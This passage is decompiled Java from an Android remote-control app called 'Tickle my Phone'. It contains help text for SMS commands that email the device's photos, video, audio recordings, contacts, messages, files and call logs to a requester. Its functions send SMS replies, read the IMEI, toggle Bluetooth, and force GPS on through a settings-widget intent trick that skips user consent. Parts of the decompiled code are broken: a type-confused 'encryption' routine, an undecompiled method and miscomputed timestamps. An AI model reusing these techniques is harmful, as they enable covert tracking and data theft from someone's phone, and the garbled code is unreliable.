        String LS_Set2Enable = GetPref(context, "KEY_SET2_ENABLE");
        String LS_Active = "Tickle my Phone Help\n";
        Debug("Value inside LS_VibrateEnable =" + LS_VibrateEnable + " Length = " + LS_VibrateEnable.length());
        Debug("Value inside LS_Vibrate =" + LS_Vibrate + " Length = " + LS_Vibrate.length());
        if (LS_PopOutEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_PopOut).append("\n").toString();
        }
        if (LS_VibrateEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Vibrate).append("\n").toString();
        }
        if (LS_VibrateNEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_VibrateN).append(" ").append(context.getString(R.string.oth46_seconds)).append("\n").toString();
        }
        if (LS_RingToneEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_RingTone).append("\n").toString();
        }
        if (LS_SMSReplyEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SMSReply).append("\n").toString();
        }
        if (LS_CallBackEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_CallBack).append("\n").toString();
        }
        if (LS_CallBackSpeakerEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_CallBackSpeaker).append("\n").toString();
        }
        if (LS_CallForwardEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_CallForward).append(" ").append(context.getString(R.string.oth43_tel_no)).append("\n").toString();
        }
        if (LS_CallForwardSpeakerEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_CallForwardSpeaker).append(" ").append(context.getString(R.string.oth43_tel_no)).append("\n").toString();
        }
        if (LS_GeoSmsEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_GeoSms).append("\n").toString();
        }
        if (LS_SendPhotoEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendPhoto).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_SendVideoEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendVideo).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_SetGPSEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SetGPS).append(" 0/1 ").append("\n").toString();
        }
        if (LS_SetWifiEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SetWifi).append(" 0/1 ").append("\n").toString();
        }
        if (LS_SendMobileInfoEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendMobileInfo).append("\n").toString();
        }
        if (LS_SendMissCallDetailEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendMissCallDetail).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_SavePhotoSDCardEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SavePhotoSDCard).append("\n").toString();
        }
        if (LS_RecordAudioEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_RecordAudio).append("\n").toString();
        }
        if (LS_RecordAudioNSecEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_RecordAudioNSec).append("\n").toString();
        }
        if (LS_SendRAudioRecordEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendRAudioRecord).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_BuzzMobileEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_BuzzMobile).append(" ").append(context.getString(R.string.oth46_seconds)).append("\n").toString();
        }
        if (LS_CalEventEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_CalEvent).append("\n").toString();
        }
        if (LS_ContactListEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_ContactList).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_Get_SmsEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Get_Sms).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_Get_Applist_Enable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Get_Applist).append(" ").append(" 0/1 ").append("\n").toString();
        }
        if (LS_Get_DirListEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Get_DirList).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_Get_FileEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Get_File).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_Play_FileEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_Play_File).append(" File Name").append("\n").toString();
        }
        if (LS_SetNetworkDataEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SetNetworkData).append(" 0/1 ").append("\n").toString();
        }
        if (LS_AddContactEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_AddContact).append(" ContactName").append("\n").toString();
        }
        if (LS_SetBluetoothEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SetBluetooth).append(" 0/1 ").append("\n").toString();
        }
        if (LS_SendSMSReportEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendSMSReport).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_SendCallReportEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendCallReport).append(" ").append(context.getString(R.string.oth44_email_address)).append("\n").toString();
        }
        if (LS_SendHelpEnable.equals("Y")) {
            LS_Active = new StringBuilder(String.valueOf(LS_Active)).append(LS_SendHelp).append("\n").toString();
        }
        Debug("Help text:\n" + LS_Active);
        return LS_Active;
    }

    public static void sendSMSBig(Context context, String phoneNumber, String message) {
        sendLongSMS(phoneNumber, message);
    }

    public static void splitEqually(String text, int size) {
        int start = 0;
        while (start < text.length()) {
            Debug(text.substring(start, Math.min(text.length(), start + size)));
            start += size;
        }
    }

    public static void sendSMS(Context context, String phoneNumber, String message) {
        String SENT = "SMS_SENT";
        String DELIVERED = "SMS_DELIVERED";
        Debug("Inside sendSMS Message lenght" + message.length());
        Debug("sendSMS: 1");
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
        Debug("sendSMS: 2");
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);
        Debug("sendSMS: 3");
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                    case SMTPMessage.NOTIFY_NEVER /*-1*/:
                        TML_Library.Info("SMS sent");
                        return;
                    case 1:
                        TML_Library.Error("ERROR003: Generic failure while sending SMS");
                        return;
                    case 2:
                        TML_Library.Error("ERROR005: Radio off while sending SMS");
                        return;
                    case 3:
                        TML_Library.Error("ERROR004: Null PDU while sending SMS");
                        return;
                    case 4:
                        TML_Library.Error("ERROR003: No service while sending SMS ");
                        return;
                    default:
                        return;
                }
            }
        }, new IntentFilter(SENT));
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                    case SMTPMessage.NOTIFY_NEVER /*-1*/:
                        TML_Library.Info("SMS delivered ");
                        return;
                    case 0:
                        TML_Library.Info("SMS not delivered Cancelled ");
                        return;
                    default:
                        return;
                }
            }
        }, new IntentFilter(DELIVERED));
        SmsManager sms = SmsManager.getDefault();
        Debug("SMS Sending to phone number :" + phoneNumber);
        Debug("Message is  :" + message + "\nand its length is " + message.length());
        Debug("Now sending the SMS srinath");
        sms.sendTextMessage(phoneNumber, null, message, sentPI, deliveredPI);
        Sleep(3);
        Debug("sendTextMessge completed");
    }

    public static String Time2Hr(String Data) {
        StringTokenizer tokens = new StringTokenizer(Data, ":");
        String first = "";
        String second = "";
        if (tokens.hasMoreTokens()) {
            return tokens.nextToken();
        }
        return first;
    }

    public static String Time2Min(String Data) {
        StringTokenizer tokens = new StringTokenizer(Data, ":");
        String first = "";
        String second = "";
        if (tokens.hasMoreTokens()) {
            first = tokens.nextToken();
        }
        if (tokens.hasMoreTokens()) {
            return tokens.nextToken();
        }
        return second;
    }

    public static void sendLongSMS(String PhoneNo, String Message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(PhoneNo, null, smsManager.divideMessage(Message), null, null);
    }

    public static String getIMEICode(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
    }

    public static void newCalEvent(Context ctx, String P_EventDescription) {
        Cursor cursor;
        if (Integer.parseInt(VERSION.SDK) > 7) {
            Debug("Its SDK :" + VERSION.SDK);
            cursor = ctx.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), new String[]{"_id", "displayName"}, "selected=1", null, null);
        } else {
            Debug("Its SDK x:" + VERSION.SDK);
            cursor = ctx.getContentResolver().query(Uri.parse("content://calendar/calendars"), new String[]{"_id", "displayName"}, "selected=1", null, null);
        }
        if (cursor != null && cursor.moveToFirst()) {
            String[] calNames = new String[cursor.getCount()];
            int[] calIds = new int[cursor.getCount()];
            for (int i = 0; i < calNames.length; i++) {
                calIds[i] = cursor.getInt(0);
                calNames[i] = cursor.getString(1);
                cursor.moveToNext();
            }
            cursor.close();
            if (calIds.length > 0) {
                Debug("Calendar Exists");
                int cal_id = calIds[0];
                ContentValues cv = new ContentValues();
                cv.put("calendar_id", Integer.valueOf(cal_id));
                cv.put("title", "TouchmyLife");
                Debug("Description is :" + P_EventDescription);
                cv.put("description", P_EventDescription);
                cv.put("eventLocation", "Tickle my Phone Location");
                cv.put("dtstart", Long.valueOf(System.currentTimeMillis() * 5000));
                cv.put("dtend", Long.valueOf((System.currentTimeMillis() * 10000) + 86400000));
                cv.put("allDay", Integer.valueOf(0));
                cv.put("hasAlarm", Integer.valueOf(1));
                if (Integer.parseInt(VERSION.SDK) > 7) {
                    Debug(" CTX part Build version is > 7  " + VERSION.SDK);
                    ctx.getContentResolver().insert(Uri.parse("content://com.android.calendar/events"), cv);
                } else {
                    Debug(" CTX part Build version is < 8 " + VERSION.SDK);
                    ctx.getContentResolver().insert(Uri.parse("content://calendar/events"), cv);
                }
                Debug("All is done");
                return;
            }
            Debug("Calendar Does not exist");
        }
    }

    public static void addToCalendar(Context ctx, String title, long dtstart, long dtend) {
        Cursor cursor;
        ContentResolver cr = ctx.getContentResolver();
        Debug("1" + Build.BOARD.toString());
        Debug("2" + Build.BRAND.toString());
        Debug("3" + Build.DEVICE.toString());
        Debug("4" + Build.HOST.toString());
        Debug("5" + Build.ID.toString());
        Debug("6" + Build.MANUFACTURER.toString());
        Debug("7" + Build.MODEL.toString());
        Debug("8" + Build.PRODUCT.toString());
        Debug("9" + Build.USER.toString());
        if (Integer.parseInt(VERSION.SDK) > 7) {
            cursor = cr.query(Uri.parse("content://com.android.calendar/calendars"), new String[]{"_id", "displayname"}, null, null, null);
        } else {
            cursor = cr.query(Uri.parse("content://calendar/calendars"), new String[]{"_id", "displayname"}, null, null, null);
        }
        if (cursor.moveToFirst()) {
            String[] calNames = new String[cursor.getCount()];
            final int[] calIds = new int[cursor.getCount()];
            for (int i = 0; i < calNames.length; i++) {
                calIds[i] = cursor.getInt(0);
                calNames[i] = cursor.getString(1);
                cursor.moveToNext();
            }
            Builder builder = new Builder(ctx);
            final String str = title;
            final long j = dtstart;
            final long j2 = dtend;
            final ContentResolver contentResolver = cr;
            builder.setSingleChoiceItems(calNames, -1, new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    Uri newEvent;
                    ContentValues cv = new ContentValues();
                    cv.put("calendar_id", Integer.valueOf(calIds[which]));
                    cv.put("title", str);
                    cv.put("dtstart", Long.valueOf(j));
                    cv.put("hasAlarm", Integer.valueOf(1));
                    cv.put("dtend", Long.valueOf(j2));
                    TML_Library.Debug("SDK Version =" + VERSION.SDK);
                    if (Integer.parseInt(VERSION.SDK) > 7) {
                        newEvent = contentResolver.insert(Uri.parse("content://com.android.calendar/events"), cv);
                    } else {
                        TML_Library.Debug("1 Added new event in calendar");
                        newEvent = contentResolver.insert(Uri.parse("content://calendar/events"), cv);
                    }
                    if (newEvent != null) {
                        long id = Long.parseLong(newEvent.getLastPathSegment());
                        ContentValues values = new ContentValues();
                        values.put("event_id", Long.valueOf(id));
                        values.put("method", Integer.valueOf(1));
                        values.put("minutes", Integer.valueOf(15));
                        if (Integer.parseInt(VERSION.SDK) > 7) {
                            contentResolver.insert(Uri.parse("content://com.android.calendar/reminders"), values);
                        } else {
                            TML_Library.Debug("2 Added new event in calendar");
                            contentResolver.insert(Uri.parse("content://calendar/reminders"), values);
                        }
                    }
                    dialog.cancel();
                }
            });
            builder.create().show();
        }
        cursor.close();
    }

    public static void LogData(Context context, String isItTMLMessage, String ls_Action) {
        SQLiteDatabase db = new TMLDDL(context).getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(TMLDDL.sender, GetParameter("ORIGINAL_ADDRESS"));
        values.put(TMLDDL.sendername, GetParameter("SENDER_CONTACT_NAME"));
        values.put(TMLDDL.servicecenter, GetParameter("SERVICE_CENTER_ADDRESS"));
        values.put(TMLDDL.smsreceivedstatus, GetParameter("SMS_RECEIVED_STATUS"));
        values.put(TMLDDL.protocolid, GetParameter("PROTOCOL_IDENTIFER"));
        values.put(TMLDDL.statusonicc, GetParameter("STATUS_ON_ICC"));
        values.put(TMLDDL.messagebody, GetParameter("MESSAGE_BODY"));
        values.put(TMLDDL.ddate, GetDateFormat("dd MMMMM yyyy"));
        values.put(TMLDDL.ttime, GetDateFormat("h:mm a"));
        values.put(TMLDDL.action, ls_Action);
        values.put(TMLDDL.result, GetParameter("RESULT"));
        values.put(TMLDDL.attr3, "");
        values.put(TMLDDL.attr4, "");
        values.put(TMLDDL.attr5, "");
        values.put(TMLDDL.attr6, "");
        values.put(TMLDDL.attr7, "");
        values.put(TMLDDL.attr8, "");
        values.put(TMLDDL.attr9, "");
        db.insert(TMLDDL.TABLE1, null, values);
        db.close();
    }

    public static void HapticFeedback(Context context) {
        ((Vibrator) context.getSystemService("vibrator")).vibrate(50);
    }

    public static void setUp() throws Exception {
        key = KeyGenerator.getInstance(algorithm).generateKey();
        cipher = Cipher.getInstance(algorithm);
    }

    public static byte[] encrypt(String input) throws InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        cipher.init(1, key);
        return cipher.doFinal(input.getBytes());
    }

    public static String decrypt(byte[] encryptionBytes) throws InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        cipher.init(2, key);
        return new String(cipher.doFinal(encryptionBytes));
    }

    /* JADX WARNING: Removed duplicated region for block: B:23:? A:{SYNTHETIC, RETURN} */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x005e  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x005e  */
    /* JADX WARNING: Removed duplicated region for block: B:23:? A:{SYNTHETIC, RETURN} */
    public static void xCopyAssets1(android.content.Context r7) {
        /*
        r0 = r7.getAssets();
        r2 = 0;
        r3 = 0;
        r5 = "Copying upgradetofull.jpg";
        Debug(r5);
        r5 = "upgradetofull.jpg";
        r2 = r0.open(r5);	 Catch:{ Exception -> 0x009a }
        r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x009a }
        r5 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x009a }
        r5.<init>();	 Catch:{ Exception -> 0x009a }
        r6 = android.os.Environment.getExternalStorageDirectory();	 Catch:{ Exception -> 0x009a }
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x009a }
        r6 = "/touchmylife/";
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x009a }
        r6 = "upgradetofull.jpg";
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x009a }
        r5 = r5.toString();	 Catch:{ Exception -> 0x009a }
        r4.<init>(r5);	 Catch:{ Exception -> 0x009a }
        copyFile(r2, r4);	 Catch:{ Exception -> 0x00b3 }
        r2.close();	 Catch:{ Exception -> 0x00b3 }
        r2 = 0;
        r4.flush();	 Catch:{ Exception -> 0x00b3 }
        r4.close();	 Catch:{ Exception -> 0x00b3 }
        r3 = 0;
    L_0x0041:
        r5 = new java.lang.StringBuilder;
        r6 = getTMLPath();
        r6 = java.lang.String.valueOf(r6);
        r5.<init>(r6);
        r6 = "tmlresult.csv";
        r5 = r5.append(r6);
        r5 = r5.toString();
        r5 = fileExists(r7, r5);
        if (r5 != 0) goto L_0x0099;
    L_0x005e:
        r5 = "tmlresult.csv not found hence copying";
        Debug(r5);
        r5 = "tmlresult.csv";
        r2 = r0.open(r5);	 Catch:{ Exception -> 0x00a5 }
        r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x00a5 }
        r5 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x00a5 }
        r5.<init>();	 Catch:{ Exception -> 0x00a5 }
        r6 = android.os.Environment.getExternalStorageDirectory();	 Catch:{ Exception -> 0x00a5 }
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x00a5 }
        r6 = "/touchmylife/";
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x00a5 }
        r6 = "tmlresult.csv";
        r5 = r5.append(r6);	 Catch:{ Exception -> 0x00a5 }
        r5 = r5.toString();	 Catch:{ Exception -> 0x00a5 }
        r4.<init>(r5);	 Catch:{ Exception -> 0x00a5 }
        copyFile(r2, r4);	 Catch:{ Exception -> 0x00b0 }
        r2.close();	 Catch:{ Exception -> 0x00b0 }
        r2 = 0;
        r4.flush();	 Catch:{ Exception -> 0x00b0 }
        r4.close();	 Catch:{ Exception -> 0x00b0 }
        r3 = 0;
    L_0x0099:
        return;
    L_0x009a:
        r1 = move-exception;
    L_0x009b:
        r5 = "tag";
        r6 = r1.getMessage();
        android.util.Log.e(r5, r6);
        goto L_0x0041;
    L_0x00a5:
        r1 = move-exception;
    L_0x00a6:
        r5 = "tag";
        r6 = r1.getMessage();
        android.util.Log.e(r5, r6);
        goto L_0x0099;
    L_0x00b0:
        r1 = move-exception;
        r3 = r4;
        goto L_0x00a6;
    L_0x00b3:
        r1 = move-exception;
        r3 = r4;
        goto L_0x009b;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.jalsalabs.ticklemyphonefull.TML_Library.xCopyAssets1(android.content.Context):void");
    }

    public static void xCopyAssets(Context context) {
        Exception e;
        AssetManager assetManager = context.getAssets();
        String[] files = null;
        try {
            files = assetManager.list("");
        } catch (IOException e2) {
            Log.e("tag", e2.getMessage());
        }
        for (int i = 0; i < files.length; i++) {
            try {
                Debug("File available " + files[i]);
                String FileName = Environment.getExternalStorageDirectory() + "/touchmylife/" + files[i];
                Debug("File about to copy :" + FileName);
                if (!fileExists(context, FileName)) {
                    Debug("**********File doest exist so copying baby" + FileName);
                    InputStream in = assetManager.open(files[i]);
                    OutputStream out = new FileOutputStream(Environment.getExternalStorageDirectory() + "/touchmylife/" + files[i]);
                    try {
                        copyFile(in, out);
                        Debug("Done");
                        in.close();
                        out.flush();
                        out.close();
                    } catch (Exception e3) {
                        e = e3;
                        OutputStream outputStream = out;
                        Log.e("tag", e.getMessage());
                    }
                }
            } catch (Exception e4) {
                e = e4;
                Log.e("tag", e.getMessage());
            }
        }
    }

    public static void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        while (true) {
            int read = in.read(buffer);
            if (read != -1) {
                out.write(buffer, 0, read);
            } else {
                return;
            }
        }
    }

    public static void PlayWelcomeMusic(Context context) {
        MediaPlayer.create(context, R.raw.touchmylife).start();
    }

    public static void PlayFileFromSD(Context context, String FileName) throws IllegalArgumentException, IllegalStateException, IOException {
        MediaPlayer mp = new MediaPlayer();
        mp.setDataSource(FileName);
        mp.prepare();
        mp.start();
    }

    public static String GetResultforCode(Context context, String Code, String AnyError) {
        Debug("CSV Reader started");
        try {
            BufferedReader br = new BufferedReader(new FileReader(new File(Environment.getExternalStorageDirectory(), "touchmylife/tmlresult.csv")));
            int lineNumber = 0;
            int Li_row = 0;
            Debug("loop starts");
            String readLine = br.readLine();
            while (true) {
                readLine = br.readLine();
                if (readLine == null) {
                    return "";
                }
                lineNumber++;
                StringTokenizer stringTokenizer = new StringTokenizer(readLine, ",");
                String[] array = readLine.split("\\,", -1);
                for (int j = 0; j < array.length; j++) {
                    Debug("Row " + Li_row + " Column " + j + " Value = " + array[j]);
                    if (array[0].equals(Code)) {
                        br.close();
                        return array[1];
                    }
                }
                Li_row++;
            }
        } catch (IOException e) {
            Debug("***********ERRRORRRRR************");
            Debug("Exception while reading csv file: " + e);
            AnyError = "File not available.";
            return "";
        }
    }

    public static String gt(String in) {
        if (in.equals("0")) {
            return "c";
        }
        if (in.equals("1")) {
            return "s";
        }
        if (in.equals("2")) {
            return "k";
        }
        if (in.equals("3")) {
            return "m";
        }
        if (in.equals("4")) {
            return "i";
        }
        if (in.equals("5")) {
            return "z";
        }
        if (in.equals("6")) {
            return "p";
        }
        if (in.equals("7")) {
            return "d";
        }
        if (in.equals("8")) {
            return "y";
        }
        if (in.equals("9")) {
            return "o";
        }
        return "X";
    }

    public static String MyEncriypt(Context context, String imei) {
        String LS_Encrypted = "";
        Random rand = new Random();
        String a1 = rand.nextInt(9);
        String a2 = imei.substring(2, 1);
        String a3 = (Integer.valueOf(imei.substring(7, 1)).intValue() % Integer.valueOf(imei.substring(7, 1)).intValue());
        String a4 = imei.substring(6, 1);
        String a5 = imei.substring(4, 1);
        String a6 = rand.nextInt(9);
        int i = Integer.valueOf(imei.substring(8, 1)).intValue() % Integer.valueOf(imei.substring(2, 1)).intValue();
        String a7 = imei.substring(8, 1);
        String a8 = imei.substring(7, 1);
        String a9 = imei.substring(9, 1);
        LS_Encrypted = a1;
        LS_Encrypted = new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a2)).toString();
        LS_Encrypted = new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a3)).toString();
        LS_Encrypted = new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a4)).toString();
        LS_Encrypted = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a5)).toString())).append(a6).toString();
        LS_Encrypted = new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a7)).toString();
        LS_Encrypted = new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a8)).toString();
        return new StringBuilder(String.valueOf(LS_Encrypted)).append(LS_Encrypted).append(gt(a9)).toString();
    }

    public static void share(Context context, String subject, String text) {
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setType("text/plain");
        intent.putExtra("android.intent.extra.SUBJECT", subject);
        intent.putExtra("android.intent.extra.TEXT", text);
        context.startActivity(Intent.createChooser(intent, text));
    }

    public static void turnGPSOn(Context context) {
        Debug("I am inside Turnon GPS");
        if (Secure.getString(context.getContentResolver(), "location_providers_allowed").contains("gps")) {
            Debug("Dont know why i came here in turnon GPS");
            return;
        }
        Intent poke = new Intent();
        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
        poke.addCategory("android.intent.category.ALTERNATIVE");
        poke.setData(Uri.parse("3"));
        context.sendBroadcast(poke);
        Debug("It should be on by Now!!!!!!!");
    }

    public static void turnGPSOff(Context context) {
        if (Secure.getString(context.getContentResolver(), "location_providers_allowed").contains("gps")) {
            Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory("android.intent.category.ALTERNATIVE");
            poke.setData(Uri.parse("3"));
            context.sendBroadcast(poke);
        }
    }

    public static Boolean isFree(Context context) {
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            return Boolean.valueOf(true);
        }
        return Boolean.valueOf(false);
    }

    public static void TurnBluetooth(Context context, String token2) throws Exception {
        String LS_SenderPhone = GetParameter("ORIGINAL_ADDRESS");
        String isfree = "";
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("Y")) {
            isfree = "";
        } else {
            isfree = " " + context.getString(R.string.oth35_Free);
        }
        String SMSBody;
        if (token2.equals("1")) {
            Debug("Calling turnbluetoothon");
            turnBluetoothOn(context);
            Debug("Sleeping for two mins");
            Sleep(2);
            String MsgDeviceName = "";
            Debug("Getting the device name");
            String DeviceName = getLocalBluetoothName();
            Debug("This is the device name :" + DeviceName);
            try {
                if (DeviceName.equals("")) {
                    MsgDeviceName = "";
                } else {
                    MsgDeviceName = "\nDevice Name: " + DeviceName;
                }
            } catch (Exception e) {
                MsgDeviceName = "";
            }
            Debug("Preparing SMS Body");
            SMSBody = "Bluetooth is switched ON" + MsgDeviceName + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else if (token2.equals("0")) {
            turnBluetoothOff(context);
            SMSBody = "Bluetooth is swtihed OFF\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else {
            SMSBody = context.getString(R.string.oth51_invalid_syntax) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now : Junk" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        }
    }

    public static void turnBluetoothOn(Context context) {
        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        if (!mBluetoothAdapter.isEnabled()) {
            mBluetoothAdapter.enable();
        }
    }

    public static void turnBluetoothOff(Context context) {
        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        if (mBluetoothAdapter.isEnabled()) {
            mBluetoothAdapter.disable();
        }
    }

    public static String getLocalBluetoothName() {
        try {
            BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            if (mBluetoothAdapter == null) {
                mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            }
            String name = mBluetoothAdapter.getName();
            if (name != null) {
                return name;
            }
            System.out.println("WTF Name is null!");
            return mBluetoothAdapter.getAddress();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String GetVersionNumber(Context context) {
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("Y")) {
            return APP_FULL_VERSION;
        }
        return APP_FULL_VERSION;
    }

    public static String GetVersionNumberOnly(Context context) {
        return VERSION;
    }

    public static void WaterMarkProcess(Context context) {
        SaveImageNow(WaterMark(WaterMark(WaterMark(WaterMark(BitmapFactory.decodeFile(getTMLPath() + "touchmylife.jpg"), context.getString(R.string.app_name), 25, 50, 60), context.getString(R.string.oth19_free_version), 25, 150, 30), context.getString(R.string.oth20_upgrade_to_full), 25, 200, 30), context.getString(R.string.oth21_actual_image), 25, 250, 30), getTMLPath() + "ticklemyphonefull.jpg");
    }

    public static void WaterMarkProcessFor(Context context, String FromFile, String ToFile) {
        String isFree = GetPref(context, "KEY_IS_FREE");
        Debug("Debug  1:  file opening now:" + FromFile);
        Bitmap bMap = BitmapFactory.decodeFile(FromFile);
        Debug("Debug  2:  file opening now:" + FromFile + "   To file :" + ToFile);
        Bitmap bout = WaterMark(WaterMark(WaterMark(WaterMark(bMap, context.getString(R.string.app_name), 25, 50, 90), context.getString(R.string.oth19_free_version), 25, 150, 50), context.getString(R.string.oth20_upgrade_to_full), 25, 200, 50), context.getString(R.string.oth21_actual_image), 25, 250, 50);
        Debug("Debug  3:  About to save image now" + FromFile + "   To file :" + ToFile);
        SaveImageNow(bout, ToFile);
        Debug("Debug  4:  Saving done" + FromFile + "   To file :" + ToFile);
    }

    public static void WaterMarkProcessBottom(Context context, String FromFile, String ToFile) {
        Debug("Debug  1:  file opening now:" + FromFile);
        Bitmap bMap = BitmapFactory.decodeFile(FromFile);
        Debug("Debug  2:  file opening now:" + FromFile + "   To file :" + ToFile);
        Bitmap bout = WaterMark(bMap, context.getString(R.string.app_name), 1, 20, 20);
        Debug("Debug  3:  About to save image now" + FromFile + "   To file :" + ToFile);
        SaveImageNow(bout, ToFile);
        Debug("Debug  4:  Saving done" + FromFile + "   To file :" + ToFile);
    }

    public static Bitmap WaterMark(Bitmap src, String watermark, int x, int y, int size) {
        Bitmap result = Bitmap.createBitmap(src.getWidth(), src.getHeight(), src.getConfig());
        Canvas canvas = new Canvas(result);
        canvas.drawBitmap(src, 0.0f, 0.0f, null);
        Paint paint = new Paint();
        paint.setTextSize((float) size);
        paint.setColor(Color.rgb(255, 0, 0));
        paint.setAntiAlias(true);
        canvas.drawText(watermark, (float) x, (float) y, paint);
        return result;
    }

    public static void SaveImageNow(Bitmap b, String jpgfilename) {
        String path = Environment.getExternalStorageDirectory().toString();
        OutputStream fOut = null;
        try {
            fOut = new FileOutputStream(new File(jpgfilename));
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        b.compress(CompressFormat.JPEG, 85, fOut);
        try {
            fOut.flush();
